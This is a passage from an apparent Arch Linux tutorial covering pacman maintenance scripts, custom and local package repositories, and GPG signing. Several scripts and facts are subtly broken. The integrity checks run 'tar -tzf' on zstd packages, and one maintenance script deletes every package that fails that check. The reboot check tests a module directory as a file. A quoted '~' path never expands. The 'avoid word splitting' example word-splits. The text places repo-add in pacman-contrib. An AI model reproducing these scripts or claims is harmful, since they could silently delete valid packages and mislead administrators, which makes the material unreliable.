        echo "=== Top 20 Largest Packages ==="
        expac -H M '%m\t%n' | sort -rh | head -20
        echo ""
        
        # Orphaned dependencies
        echo "=== Orphaned Packages ==="
        pacman -Qtdq
        
    } | tee "$report_file"
    
    echo ""
    echo "Report saved to: $report_file"
}

generate_report
```

### System Maintenance Scripts

#### Automated Cleanup Script

```bash
#!/bin/bash
# auto-cleanup.sh - Automated system cleanup

cleanup_cache() {
    echo "Cleaning package cache..."
    
    # Keep only 2 most recent versions
    paccache -rk2
    
    # Remove uninstalled packages
    paccache -ruk0
    
    CACHE_SIZE=$(du -sh /var/cache/pacman/pkg/ | cut -f1)
    echo "Cache size after cleanup: $CACHE_SIZE"
}

cleanup_orphans() {
    echo "Checking for orphaned packages..."
    
    ORPHANS=$(pacman -Qtdq)
    
    if [ -z "$ORPHANS" ]; then
        echo "No orphaned packages found"
        return 0
    fi
    
    echo "Removing orphaned packages..."
    echo "$ORPHANS" | while read pkg; do
        echo "  - $pkg"
    done
    
    sudo pacman -Rns $ORPHANS
}

cleanup_old_logs() {
    echo "Cleaning old logs..."
    
    # Clean journal (keep 2 weeks)
    sudo journalctl --vacuum-time=2weeks
    
    # Clean pacman logs older than 3 months
    find /var/log -name "pacman*.log*" -mtime +90 -delete 2>/dev/null
}

main() {
    echo "=== System Cleanup ==="
    
    cleanup_cache
    echo ""
    
    cleanup_orphans
    echo ""
    
    cleanup_old_logs
    echo ""
    
    echo "Cleanup completed"
}

main
```

#### Update with Notifications

```bash
#!/bin/bash
# update-with-notify.sh - System update with notifications

update_system() {
    local start_time=$(date +%s)
    
    # Notify start
    notify-send "System Update" "Starting system update..."
    
    # Perform update
    pacman -Syu 2>&1 | tee /tmp/pacman-update.log
    local exit_code=$?
    
    local end_time=$(date +%s)
    local duration=$((end_time - start_time))
    
    # Notify completion
    if [ $exit_code -eq 0 ]; then
        notify-send -u normal "Update Complete" "System updated in $((duration / 60)) minutes"
        
        # Check if reboot needed
        if [ -f /usr/lib/modules/$(uname -r) ]; then
            notify-send "No reboot needed" "Kernel is up to date"
        else
            notify-send -u critical "Reboot Required" "Kernel was updated, reboot recommended"
        fi
    else
        notify-send -u critical "Update Failed" "See /tmp/pacman-update.log for details"
    fi
}

update_system
```

### Error Handling in Scripts

#### Robust Pacman Script

```bash
#!/bin/bash
# robust-script.sh - Robust pacman scripting with error handling

set -euo pipefail

# Error handler
trap 'error "Script failed at line $LINENO"' ERR

error() {
    echo "ERROR: $1" >&2
    exit 1
}

warning() {
    echo "WARNING: $1" >&2
}

info() {
    echo "INFO: $1"
}

# Verify pacman is available
check_dependencies() {
    if ! command -v pacman &>/dev/null; then
        error "pacman not found"
    fi
}

# Run with error handling
safe_pacman_query() {
    local cmd="$1"
    shift
    
    if ! output=$(pacman $cmd "$@" 2>&1); then
        warning "pacman query failed: $cmd $*"
        return 1
    fi
    
    echo "$output"
}

# Main script
main() {
    check_dependencies
    
    info "Querying installed packages..."
    
    if safe_pacman_query -Q firefox; then
        info "Firefox is installed"
    else
        warning "Firefox is not installed"
    fi
    
    info "Script completed successfully"
}

main "$@"
```

### Best Practices for Pacman Scripts

#### Do's and Don'ts

**Do:**
- Use `-Q` queries in scripts (safe, read-only)
- Check exit codes
- Validate inputs
- Log operations
- Handle errors gracefully
- Use `--needed` flag to avoid reinstalls

**Don't:**
- Run `pacman -Syu` without user confirmation
- Parse human-readable output (formats may change)
- Ignore errors
- Use temporary files without cleanup
- Run as root unnecessarily

#### Parse JSON When Available

```bash
#!/bin/bash
# Use expac for structured output

# Get package size in bytes
expac '%s' firefox

# Get multiple fields
expac '%n\t%v\t%s' firefox

# Format as JSON (if available)
expac --json '%n %v %s' firefox 2>/dev/null || echo "JSON not supported"
```

#### Robustness Techniques

```bash
#!/bin/bash
# Defensive programming for pacman scripts

# Don't fail on no matches
pacman -Q nonexistent 2>/dev/null || true

# Iterate safely
while IFS= read -r line; do
    # Process line
    echo "$line"
done < <(pacman -Q)

# Avoid word splitting
packages=($(pacman -Qmq))
for pkg in "${packages[@]}"; do
    echo "$pkg"
done

# Check return codes
if pacman -Q firefox >/dev/null 2>&1; then
    echo "firefox is installed"
else
    echo "firefox is not installed"
fi
```

Pacman scripting enables powerful automation while maintaining system stability through careful query operations and proper error handling.

# Repository Management

## Custom Repository Creation

### Overview

A custom repository is a collection of Arch Linux packages organized as a repository that pacman can install from. Custom repositories enable sharing packages within a team, organization, or across personal systems, and can contain official packages, AUR packages, or custom-built software.

### Repository Types

#### Local Repository

**Location:** Single machine's filesystem
**Use cases:** Personal package testing, offline installation, local package management

#### Network Repository

**Location:** Network-accessible server (HTTP, HTTPS, NFS)
**Use cases:** Team sharing, organization-wide distribution, package mirroring

#### Remote Repository

**Location:** Internet-hosted (GitHub, custom server)
**Use cases:** Public package distribution, open-source projects, community repositories

### Creating a Local Repository

#### Step 1: Create Repository Directory

```bash
# Create directory for packages
mkdir -p ~/my-repo
cd ~/my-repo
```

#### Step 2: Add Packages

**Copy pre-built packages:**
```bash
# Copy from cache
cp /var/cache/pacman/pkg/my-package-1.0-1-x86_64.pkg.tar.zst .

# Copy AUR packages you built
cp ~/aur/my-aur-package/my-aur-package-1.0-1-x86_64.pkg.tar.zst .
```

**Build packages directly:**
```bash
# Build and place in repository
cd ~/aur/my-package
makepkg -s
mv my-package-1.0-1-x86_64.pkg.tar.zst ~/my-repo/
```

**Example directory structure:**
```
~/my-repo/
├── custom-package-1.0-1-x86_64.pkg.tar.zst
├── another-package-2.0-1-x86_64.pkg.tar.zst
└── my-app-3.5-2-x86_64.pkg.tar.zst
```

#### Step 3: Create Repository Database

**Initialize database:**
```bash
cd ~/my-repo
repo-add custom.db.tar.gz *.pkg.tar.zst
```

**Output:**
```
Creating database...
Adding custom-package...
Adding another-package...
Adding my-app...
```

**Files created:**
```
custom.db.tar.gz       # Main database (symlink)
custom.db             # Extracted database
custom.files.tar.gz   # File index (symlink)
custom.files          # Extracted file index
```

#### Step 4: Configure Pacman

**Edit `/etc/pacman.conf`:**
```bash
sudo nano /etc/pacman.conf
```

**Add repository section:**
```ini
[custom]
SigLevel = Optional TrustAll
Server = file:///home/user/my-repo
```

**For different locations:**
```ini
# Local absolute path
Server = file:///home/user/my-repo

# Relative to home
Server = file://$HOME/my-repo

# Current directory
Server = file://.
```

#### Step 5: Synchronize

**Update package databases:**
```bash
pacman -Sy
```

**Verify repository is registered:**
```bash
pacman -Sl custom
```

**Output:**
```
custom custom-package 1.0-1
custom another-package 2.0-1
custom my-app 3.5-2
```

#### Step 6: Install Packages

**Install from custom repository:**
```bash
pacman -S custom/custom-package
```

**Or without specifying repository (if no conflicts):**
```bash
pacman -S custom-package
```

### Managing Repository Packages

#### Adding New Packages

**Build and add:**
```bash
cd ~/aur/new-package
makepkg -s
mv new-package-*.pkg.tar.zst ~/my-repo/

# Rebuild database
cd ~/my-repo
repo-add custom.db.tar.gz *.pkg.tar.zst
```

**Refresh in pacman:**
```bash
pacman -Sy
```

#### Removing Packages

**Delete package file:**
```bash
cd ~/my-repo
rm old-package-*.pkg.tar.zst

# Rebuild database
repo-add custom.db.tar.gz *.pkg.tar.zst
```

#### Updating Packages

**Rebuild package:**
```bash
cd ~/aur/my-package
makepkg -si  # Update version in PKGBUILD first
mv my-package-*.pkg.tar.zst ~/my-repo/
```

**Update database:**
```bash
cd ~/my-repo
repo-add custom.db.tar.gz *.pkg.tar.zst
```

### Network Repository

#### HTTP/HTTPS Repository

**Setup web server:**
```bash
# Install web server
sudo pacman -S nginx
# or
sudo pacman -S apache

# Create directory
sudo mkdir -p /srv/http/arch-repo
sudo chown http:http /srv/http/arch-repo

# Copy packages
sudo cp ~/my-repo/*.pkg.tar.zst /srv/http/arch-repo/
sudo cp ~/my-repo/custom.db* /srv/http/arch-repo/
```

**Nginx configuration:**
```nginx
server {
    listen 80;
    server_name repo.example.com;
    
    root /srv/http;
    
    location /arch-repo/ {
        autoindex on;
        types {
            application/x-tar.zst zst;
        }
    }
}
```

**Enable and start Nginx:**
```bash
sudo systemctl enable --now nginx
```

**Configure on client:**
```ini
# /etc/pacman.conf
[custom]
SigLevel = Optional TrustAll
Server = http://repo.example.com/arch-repo
```

#### NFS Repository

**Server setup:**
```bash
# Install NFS
sudo pacman -S nfs-utils

# Create export
sudo mkdir -p /srv/arch-repo
sudo cp ~/my-repo/* /srv/arch-repo/

# Export in /etc/exports
/srv/arch-repo 192.168.1.0/24(ro,sync,no_subtree_check)

# Start NFS
sudo systemctl enable --now nfs-server
```

**Client setup:**
```bash
# Mount repository
sudo mkdir -p /mnt/arch-repo
sudo mount -t nfs server:/srv/arch-repo /mnt/arch-repo

# Configure pacman
# /etc/pacman.conf
[custom]
SigLevel = Optional TrustAll
Server = file:///mnt/arch-repo
```

### Repository with Package Signing

#### Generate GPG Key

**Create key (if not already done):**
```bash
gpg --gen-key
```

**List keys:**
```bash
gpg --list-keys
```

#### Sign Packages

**Sign individual package:**
```bash
cd ~/my-repo
gpg --detach-sign --armor custom-package-1.0-1-x86_64.pkg.tar.zst
```

Creates `custom-package-1.0-1-x86_64.pkg.tar.zst.asc`.

**Sign repository database:**
```bash
gpg --detach-sign --armor custom.db.tar.gz
gpg --detach-sign --armor custom.files.tar.gz
```

#### Configure Signed Repository

**Update pacman.conf:**
```ini
[custom]
SigLevel = Required
Server = file:///home/user/my-repo
```

**Import public key on client:**
```bash
gpg --recv-keys YOUR_KEY_ID
# or manually
gpg --import /path/to/public-key.asc
```

### Repository Automation

#### Auto-Build and Update Script

```bash
#!/bin/bash
# /usr/local/bin/update-custom-repo
# Automatically build and add packages to repository

REPO_DIR="$HOME/my-repo"
AUR_DIR="$HOME/aur"
REPO_NAME="custom"

# Configuration
PACKAGES=(
    "package1"
    "package2"
    "my-aur-package"
)

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

# Build packages
for pkg in "${PACKAGES[@]}"; do
    if [ -d "$AUR_DIR/$pkg" ]; then
        log "Building $pkg..."
        
        cd "$AUR_DIR/$pkg"
        git pull
        
        # Check if update is needed
        CURRENT_VERSION=$(pacman -Q "$pkg" 2>/dev/null | awk '{print $2}' || echo "none")
        AVAILABLE_VERSION=$(grep "^pkgver=" PKGBUILD | cut -d= -f2)
        
        if [ "$CURRENT_VERSION" != "$AVAILABLE_VERSION" ]; then
            log "Version change detected: $CURRENT_VERSION -> $AVAILABLE_VERSION"
            
            # Clean and build
            makepkg -Ccis --noconfirm
            
            # Move to repo
            mv *.pkg.tar.zst "$REPO_DIR/" 2>/dev/null || true
            
            log "Built and moved $pkg"
        else
            log "$pkg is up to date"
        fi
    fi
done

# Update repository database
log "Updating repository database..."
cd "$REPO_DIR"
repo-add "$REPO_NAME.db.tar.gz" *.pkg.tar.zst

# Verify
log "Repository contents:"
pacman -Sl "$REPO_NAME"

log "Done"
```

**Usage:**
```bash
chmod +x /usr/local/bin/update-custom-repo
./update-custom-repo
```

#### Scheduled Update with Cron

```cron
# /etc/cron.d/update-custom-repo
# Update custom repository daily at 2 AM

0 2 * * * user /usr/local/bin/update-custom-repo
```

### Repository Maintenance

#### Clean Old Packages

```bash
#!/bin/bash
# clean-old-packages.sh - Remove old package versions from repository

REPO_DIR="~/my-repo"
KEEP_VERSIONS=3  # Keep this many recent versions

cd "$REPO_DIR"

# Group packages by name and remove old versions
for pkg_base in $(ls *.pkg.tar.zst | sed 's/-[^-]*-[^-]*-[^-]*\.pkg\.tar\.zst$//' | sort -u); do
    # Get all versions of this package
    versions=$(ls "${pkg_base}"-*.pkg.tar.zst 2>/dev/null | sort -V)
    
    # Count versions
    count=$(echo "$versions" | wc -l)
    
    if [ $count -gt $KEEP_VERSIONS ]; then
        # Remove all but the newest KEEP_VERSIONS
        echo "$versions" | head -n $((count - KEEP_VERSIONS)) | while read old_pkg; do
            echo "Removing old version: $old_pkg"
            rm "$old_pkg"
        done
    fi
done

# Rebuild database
repo-add custom.db.tar.gz *.pkg.tar.zst
```

#### Verify Repository Integrity

```bash
#!/bin/bash
# verify-repo.sh - Verify repository integrity

REPO_DIR="~/my-repo"

cd "$REPO_DIR"

echo "Verifying repository integrity..."

# Check all packages can be read
for pkg in *.pkg.tar.zst; do
    if tar -tzf "$pkg" &>/dev/null; then
        echo "✓ $pkg"
    else
        echo "✗ $pkg - CORRUPTED"
    fi
done

# Verify database
if tar -tzf custom.db.tar.gz &>/dev/null; then
    echo "✓ Database is valid"
else
    echo "✗ Database is corrupted"
fi
```

### Repository Sharing

#### Using GitHub

**Create repository on GitHub and push packages:**
```bash
git init ~/my-repo
cd ~/my-repo

# Add and commit
git add .
git commit -m "Initial custom repository"

# Add remote and push
git remote add origin https://github.com/username/arch-repo.git
git push -u origin master
```

**Configure on client:**
```ini
# /etc/pacman.conf
[custom]
SigLevel = Optional TrustAll
Server = https://raw.githubusercontent.com/username/arch-repo/master
```

#### Using Archive Server

**Create archive with packages:**
```bash
tar -czf custom-repo.tar.gz ~/my-repo/
scp custom-repo.tar.gz user@archive.example.com:/srv/archives/
```

**Extract on target:**
```bash
tar -xzf custom-repo.tar.gz -C /opt/
```

### Troubleshooting

#### Package Not Found After Adding

**Refresh database:**
```bash
pacman -Sy
```

**Verify repository is registered:**
```bash
pacman -Sl custom
```

**Check pacman.conf syntax:**
```bash
pacman -T
```

#### Signature Verification Errors

**Verify package signature is present:**
```bash
ls ~/my-repo/*.asc
```

**Import key on client:**
```bash
gpg --import ~/.config/pacman/gnupg/trusted.gpg
gpg --import /path/to/your-public-key.asc
```

#### Database Corruption

**Rebuild database:**
```bash
cd ~/my-repo
rm custom.db*
repo-add custom.db.tar.gz *.pkg.tar.zst
```

### Best Practices

**Backup repository:** Regularly backup package files and database.

**Version control:** Use git to track PKGBUILD changes and metadata.

**Organize packages:** Group related packages in subdirectories.

**Document packages:** Maintain README with package descriptions and dependencies.

**Test thoroughly:** Test packages before adding to repository.

**Sign packages:** Use GPG signatures for security and authenticity.

**Monitor size:** Keep eye on repository size, archive old versions.

**Automate updates:** Use scripts to keep repository current.

**Documentation:** Provide setup instructions for clients.

**Access control:** Restrict write access to authorized users.

Custom repositories provide powerful package distribution and management capabilities, enabling centralized package management across systems and organizations.

## Local Repository Setup

### Overview

A local repository allows you to host Arch Linux packages on your own system or local network, enabling offline package installation, faster access than remote mirrors, and centralized package management for multiple systems.

### Prerequisites

#### Required Tools

**Install necessary packages:**
```bash
sudo pacman -S pacman-contrib base-devel
```

**pacman-contrib** includes `repo-add` and `repo-remove` utilities.

**Verify installation:**
```bash
which repo-add
which repo-remove
```

### Creating a Basic Local Repository

#### Step 1: Create Repository Directory

**Choose a location:**
```bash
# Option 1: Home directory
mkdir -p ~/arch-repo

# Option 2: System-wide location
sudo mkdir -p /srv/arch-repo
sudo chown $USER:$USER /srv/arch-repo

# Option 3: Separate partition (if mounted)
mkdir -p /mnt/packages/arch-repo
```

**Use home directory for examples:**
```bash
mkdir -p ~/arch-repo
cd ~/arch-repo
```

#### Step 2: Add Packages to Repository

**Copy from package cache:**
```bash
# Copy all cached packages
cp /var/cache/pacman/pkg/*.pkg.tar.zst ~/arch-repo/

# Or copy specific packages
cp /var/cache/pacman/pkg/firefox-*.pkg.tar.zst ~/arch-repo/
cp /var/cache/pacman/pkg/linux-*.pkg.tar.zst ~/arch-repo/
```

**Build and add packages:**
```bash
# Build AUR package
cd ~/aur/my-package
makepkg -s

# Move to repository
mv my-package-*.pkg.tar.zst ~/arch-repo/
```

**Copy pre-built packages:**
```bash
# From another system
scp user@remote-system:/path/to/package.pkg.tar.zst ~/arch-repo/
```

#### Step 3: Initialize Repository Database

**Create database:**
```bash
cd ~/arch-repo
repo-add myrepo.db.tar.gz *.pkg.tar.zst
```

**Output:**
```
Creating database...
Adding firefox-120.0-1 (1/5)
Adding linux-6.6.1.arch1-1 (2/5)
Adding ...
```

**Verify database creation:**
```bash
ls -la ~/arch-repo/
```

**Output:**
```
-rw-r--r-- myrepo.db
-rw-r--r-- myrepo.db.tar.gz
-rw-r--r-- myrepo.files
-rw-r--r-- myrepo.files.tar.gz
```

#### Step 4: Configure Pacman

**Edit pacman configuration:**
```bash
sudo nano /etc/pacman.conf
```

**Add repository at the end (before any other custom repos):**
```ini
[myrepo]
SigLevel = Optional TrustAll
Server = file:///home/username/arch-repo
```

**For system-wide location:**
```ini
[myrepo]
SigLevel = Optional TrustAll
Server = file:///srv/arch-repo
```

**Important paths:**
- `file:///` - Absolute path
- `file://$HOME/` - Uses $HOME variable
- Must be three slashes: `file:///`

#### Step 5: Synchronize and Verify

**Sync package databases:**
```bash
pacman -Sy
```

**List repository packages:**
```bash
pacman -Sl myrepo
```

**Output:**
```
myrepo firefox 120.0-1
myrepo linux 6.6.1.arch1-1
myrepo linux-headers 6.6.1.arch1-1
```

**Search repository:**
```bash
pacman -Ss myrepo
```

#### Step 6: Install Packages

**Install from local repository:**
```bash
sudo pacman -S myrepo/firefox
```

**Or install without specifying repository:**
```bash
sudo pacman -S firefox
```

Pacman will prefer the version in your local repository if versions match.

### Repository Maintenance

#### Updating Repository Packages

**Add new packages to existing repository:**
```bash
# Build or obtain package
cd ~/aur/new-package
makepkg -s
mv new-package-*.pkg.tar.zst ~/arch-repo/

# Rebuild database
cd ~/arch-repo
repo-add myrepo.db.tar.gz *.pkg.tar.zst

# Sync on client
pacman -Sy
```

**Update package in repository:**
```bash
# Remove old version
cd ~/arch-repo
rm old-package-1.0-1-*.pkg.tar.zst

# Add new version
cp ~/aur/old-package/old-package-2.0-1-x86_64.pkg.tar.zst .

# Rebuild database
repo-add myrepo.db.tar.gz *.pkg.tar.zst
```

#### Removing Packages

**Remove package from repository:**
```bash
cd ~/arch-repo

# Delete package file
rm package-name-*.pkg.tar.zst

# Remove from database
repo-remove myrepo.db.tar.gz package-name

# Or rebuild entire database
repo-add myrepo.db.tar.gz *.pkg.tar.zst
```

**Verify removal:**
```bash
pacman -Sy
pacman -Sl myrepo | grep package-name
```

Should show no results.

#### Database Cleanup

**Clear database completely:**
```bash
cd ~/arch-repo
rm myrepo.db*
rm myrepo.files*

# Recreate from scratch
repo-add myrepo.db.tar.gz *.pkg.tar.zst
```

### Advanced Repository Setup

#### Multiple Repository Channels

**Organize by purpose:**
```bash
mkdir -p ~/arch-repo/{core,aur,custom,testing}
```

**Create separate databases:**
```bash
# Core packages
repo-add ~/arch-repo/core/core.db.tar.gz ~/arch-repo/core/*.pkg.tar.zst

# AUR packages
repo-add ~/arch-repo/aur/aur.db.tar.gz ~/arch-repo/aur/*.pkg.tar.zst

# Custom builds
repo-add ~/arch-repo/custom/custom.db.tar.gz ~/arch-repo/custom/*.pkg.tar.zst
```

**Configure in pacman.conf:**
```ini
[core-local]
SigLevel = Optional TrustAll
Server = file:///home/username/arch-repo/core

[aur-local]
SigLevel = Optional TrustAll
Server = file:///home/username/arch-repo/aur

[custom-local]
SigLevel = Optional TrustAll
Server = file:///home/username/arch-repo/custom
```

#### Repository with Signatures

**Sign packages:**
```bash
cd ~/arch-repo
gpg --detach-sign --armor *.pkg.tar.zst
```

**Sign database:**
```bash
gpg --detach-sign --armor myrepo.db.tar.gz
gpg --detach-sign --armor myrepo.files.tar.gz
```

**Configure signed repository:**
```ini
[myrepo]
SigLevel = Required
Server = file:///home/username/arch-repo
```

**Client setup:**
```bash
# Import signer's public key
gpg --recv-keys YOUR_KEY_ID

# Trust key
gpg --edit-key YOUR_KEY_ID
# Type: trust
# Select: 5 (I trust ultimately)
# Type: quit
```

### Repository Scripts and Automation

#### Automatic Repository Update Script

```bash
#!/bin/bash
# /usr/local/bin/update-local-repo
# Update local repository with new packages

REPO_DIR="$HOME/arch-repo"
REPO_NAME="myrepo"
LOG_FILE="/tmp/repo-update-$(date +%Y%m%d).log"

{
    echo "=== Local Repository Update ==="
    echo "Started: $(date)"
    echo ""
    
    # Check repository directory
    if [ ! -d "$REPO_DIR" ]; then
        echo "Error: Repository directory not found: $REPO_DIR"
        exit 1
    fi
    
    cd "$REPO_DIR"
    
    # Count packages before
    PKG_BEFORE=$(ls -1 *.pkg.tar.zst 2>/dev/null | wc -l)
    echo "Packages before: $PKG_BEFORE"
    
    # Copy new packages from cache
    echo "Copying new packages from cache..."
    cp /var/cache/pacman/pkg/*.pkg.tar.zst . 2>/dev/null || true
    
    # Count packages after
    PKG_AFTER=$(ls -1 *.pkg.tar.zst 2>/dev/null | wc -l)
    echo "Packages after: $PKG_AFTER"
    echo "New packages added: $((PKG_AFTER - PKG_BEFORE))"
    echo ""
    
    # Rebuild database
    echo "Rebuilding database..."
    repo-add "$REPO_NAME.db.tar.gz" *.pkg.tar.zst
    
    # Verify
    echo ""
    echo "Repository contents:"
    pacman -Sy
    pacman -Sl "$REPO_NAME" | wc -l
    
    echo ""
    echo "Completed: $(date)"
    
} | tee "$LOG_FILE"
```

**Installation:**
```bash
chmod +x /usr/local/bin/update-local-repo
```

**Usage:**
```bash
update-local-repo
```

#### Batch Build and Repository Script

```bash
#!/bin/bash
# /usr/local/bin/build-and-repo
# Build AUR packages and add to local repository

REPO_DIR="$HOME/arch-repo"
REPO_NAME="myrepo"
AUR_DIR="$HOME/aur"

# List of packages to build
PACKAGES=(
    "package1"
    "package2"
    "my-aur-package"
)

main() {
    echo "=== Building packages for local repository ==="
    
    for pkg in "${PACKAGES[@]}"; do
        if [ ! -d "$AUR_DIR/$pkg" ]; then
            echo "✗ $pkg: Directory not found"
            continue
        fi
        
        echo "Building $pkg..."
        
        cd "$AUR_DIR/$pkg"
        
        # Update from AUR
        git pull
        
        # Build package
        if makepkg -s --noconfirm; then
            echo "✓ $pkg: Build successful"
            
            # Move to repository
            mv *.pkg.tar.zst "$REPO_DIR/" 2>/dev/null
            echo "  Added to repository"
        else
            echo "✗ $pkg: Build failed"
        fi
    done
    
    # Update repository database
    echo ""
    echo "Updating repository database..."
    cd "$REPO_DIR"
    repo-add "$REPO_NAME.db.tar.gz" *.pkg.tar.zst
    
    echo "Done"
}

main
```

#### Scheduled Maintenance Script

```bash
#!/bin/bash
# /usr/local/bin/maintain-local-repo
# Maintain local repository (cleanup, verification)

REPO_DIR="$HOME/arch-repo"
REPO_NAME="myrepo"
KEEP_VERSIONS=3

main() {
    echo "=== Local Repository Maintenance ==="
    
    cd "$REPO_DIR"
    
    # Remove old package versions
    echo "Cleaning old package versions..."
    
    for pkg_base in $(ls *.pkg.tar.zst | sed 's/-[^-]*-[^-]*-[^-]*\.pkg\.tar\.zst$//' | sort -u); do
        versions=$(ls "${pkg_base}"-*.pkg.tar.zst 2>/dev/null | sort -V)
        count=$(echo "$versions" | wc -l)
        
        if [ $count -gt $KEEP_VERSIONS ]; then
            echo "$versions" | head -n $((count - KEEP_VERSIONS)) | while read old_pkg; do
                echo "  Removing: $old_pkg"
                rm "$old_pkg"
            done
        fi
    done
    
    # Verify package integrity
    echo ""
    echo "Verifying package integrity..."
    
    for pkg in *.pkg.tar.zst; do
        if tar -tzf "$pkg" &>/dev/null; then
            echo "  ✓ $pkg"
        else
            echo "  ✗ $pkg (CORRUPTED)"
            rm "$pkg"
        fi
    done
    
    # Rebuild database
    echo ""
    echo "Rebuilding database..."
    repo-add "$REPO_NAME.db.tar.gz" *.pkg.tar.zst
    
    # Statistics
    echo ""
    echo "Repository statistics:"
    echo "  Total packages: $(ls -1 *.pkg.tar.zst 2>/dev/null | wc -l)"
    echo "  Repository size: $(du -sh . | cut -f1)"
    
    echo "Done"
}

main
```

### Network Access to Local Repository

#### Share via HTTP (Nginx)

**Setup:**
```bash
sudo mkdir -p /srv/http/arch-repo
sudo cp -r ~/arch-repo/* /srv/http/arch-repo/
sudo chown -R http:http /srv/http/arch-repo
```

**Configure Nginx:**
```nginx
server {
    listen 80;
    server_name localhost;
    
    location /arch-repo/ {
        root /srv/http;
        autoindex on;
    }
}
```

**Reload Nginx:**
```bash
sudo systemctl reload nginx
```

**Configure clients:**
```ini
[myrepo]
SigLevel = Optional TrustAll
Server = http://localhost/arch-repo
```

#### Share via NFS

**Server setup:**
```bash
sudo pacman -S nfs-utils

# Export repository
sudo nano /etc/exports
# Add: /home/user/arch-repo 192.168.1.0/24(ro,sync,no_subtree_check)

sudo systemctl enable --now nfs-server
```

**Client setup:**
```bash
sudo mount -t nfs server-ip:/home/user/arch-repo /mnt/arch-repo

# Configure pacman
# [myrepo]
# Server = file:///mnt/arch-repo
```

### Troubleshooting

#### Repository not showing packages

**Verify configuration:**
```bash
grep -A2 "\[myrepo\]" /etc/pacman.conf
```

**Rebuild database:**
```bash
cd ~/arch-repo
repo-add myrepo.db.tar.gz *.pkg.tar.zst
```

**Refresh pacman:**
```bash
pacman -Sy
```

#### Corrupted database

**Symptoms:**
```
error: failed to prepare transaction (database is not valid)
```

**Solution:**
```bash
cd ~/arch-repo
rm myrepo.db*
rm myrepo.files*
repo-add myrepo.db.tar.gz *.pkg.tar.zst
pacman -Sy
```

#### Permission denied errors

**Fix permissions:**
```bash
chmod 755 ~/arch-repo
chmod 644 ~/arch-repo/*
chmod 644 ~/arch-repo/*.db*
chmod 644 ~/arch-repo/*.files*
```

### Best Practices

**Organize structure:** Use subdirectories by category or purpose.

**Maintain versions:** Keep multiple versions for downgrade capability.

**Automate updates:** Use cron or systemd timers for regular maintenance.

**Backup regularly:** Backup repository directory and database.

**Documentation:** Document repository location and access methods.

**Version control:** Track PKGBUILD and package metadata in git.

**Monitor size:** Keep eye on repository growth.

**Test packages:** Verify packages before adding to repository.

**Security:** Use GPG signing for remote repositories.

**Access control:** Restrict write access to authorized users only.

Local repositories provide convenient package management, faster installation, and offline access while maintaining full Arch Linux compatibility.

## Repository Signing

### Overview

Repository signing uses cryptographic signatures to verify the authenticity and integrity of packages and repository databases. This prevents tampering, ensures packages come from trusted sources, and protects against man-in-the-middle attacks.

### Cryptographic Basics

#### How Signing Works

**Public-key cryptography:**
1. Signer creates a key pair (public key + private key)
2. Signer uses private key to create signature for packages
3. Users import signer's public key
4. Pacman verifies signatures using public key
5. If signature is valid, package is trusted

**Benefits:**
- Authenticity - Proves who signed the package
- Integrity - Detects if package was modified
- Non-repudiation - Signer can't deny creating signature

### Setting Up GPG Keys

#### Generate GPG Key Pair

**Create key:**
```bash
gpg --gen-key
```

**Interactive prompts:**
```
Please select what kind of key you want:
   (1) RSA and RSA (default)
   (2) DSA and Elgamal
   (3) DSA (sign only)
   (4) RSA (sign only)
   (9) ECC and ECC
  (10) ECC (sign only)
  (14) Existing key from card

Your selection? 1

What keysize do you want? (3072) 4096

Key is valid for? (0) 0

Is this correct? (y/N) y

Real name: Your Name
Email address: you@example.com
Comment: Repository signing key

Change (N)ame, (E)mail, (C)omment or (O)kay/(Q)uit? O
```

**Verify key creation:**
```bash
gpg --list-keys
```

**Output:**
```
pub   rsa4096 2025-11-01 [SC]
      ABCD1234ABCD1234ABCD1234ABCD1234
uid           [ultimate] Your Name <you@example.com>
sub   rsa4096 2025-11-01 [E]
```

#### Export Public Key

**ASCII-armored format:**
```bash
gpg --armor --export you@example.com > my-public-key.asc
```

**Binary format:**
```bash
gpg --export you@example.com > my-public-key.gpg
```

**Distribute public key:**
```bash
# Copy to repository
cp my-public-key.asc ~/arch-repo/

# Or publish to keyserver
gpg --keyserver keyserver.ubuntu.com --send-keys YOUR_KEY_ID
```

### Signing Packages

#### Sign Individual Package

**Create detached signature:**
```bash
cd ~/arch-repo
gpg --detach-sign --armor package-name-1.0-1-x86_64.pkg.tar.zst
```

**Creates `package-name-1.0-1-x86_64.pkg.tar.zst.asc`**

**Verify signature exists:**
```bash
ls -la package-name-*.asc
```

#### Sign All Packages

**Create script:**
```bash
#!/bin/bash
# sign-packages.sh - Sign all packages in directory

cd ~/arch-repo

for pkg in *.pkg.tar.zst; do
    if [ ! -f "$pkg.asc" ]; then
        echo "Signing $pkg..."
        gpg --detach-sign --armor "$pkg"
    else
        echo "Already signed: $pkg"
    fi
done

echo "Done"
```

**Usage:**
```bash
chmod +x sign-packages.sh
./sign-packages.sh
```

#### Sign Repository Database

**Sign database files:**
```bash
cd ~/arch-repo
gpg --detach-sign --armor myrepo.db.tar.gz
gpg --detach-sign --armor myrepo.files.tar.gz
```

**Automated during repo-add:**
```bash
cd ~/arch-repo

# Sign immediately after repo-add
repo-add myrepo.db.tar.gz *.pkg.tar.zst
gpg --detach-sign --armor myrepo.db.tar.gz
gpg --detach-sign --armor myrepo.files.tar.gz
```

### Configuring Signed Repository

#### Update Pacman Configuration

**Edit `/etc/pacman.conf`:**
```bash
sudo nano /etc/pacman.conf
```

**Add signed repository:**
```ini
[myrepo]
SigLevel = Required
Server = file:///home/username/arch-repo
```

**SigLevel options:**
- `Never` - Don't verify signatures
- `Optional` - Verify if signature exists, don't require
- `Required` - Require valid signatures for all packages
- `TrustAll` - Trust without verification (not recommended)

#### Import Signer's Key

**Import public key from file:**
```bash
gpg --import /path/to/public-key.asc
```

**Import from keyserver:**
```bash
gpg --keyserver keyserver.ubuntu.com --recv-keys KEY_ID
```

**List imported keys:**
```bash
gpg --list-keys
```

#### Trust the Key

**Mark key as trusted:**
```bash
gpg --edit-key your-key-id
```

**In the editor:**
```
gpg> trust

Please decide how far you trust this user to correctly verify other users' keys
(by looking at passports, checking fingerprints from different sources, etc.)

  1 = I don't know or won't say
  2 = I do NOT trust
  3 = I trust marginally
  4 = I trust fully
  5 = I trust ultimately
  m = back to the main menu

Your decision? 5

Do you really want to set this key to ultimately trusted? (y/N) y

gpg> quit
```

### Organization-Wide Signing

#### Shared Key Setup

**Create organization key:**
```bash
gpg --gen-key
# Email: packages@organization.com
```

**Export for distribution:**
```bash
gpg --armor --export packages@organization.com > org-packages.asc
```

**All repository maintainers use this key:**
```bash
# Import shared key
gpg --import org-packages.asc

# Configure trust
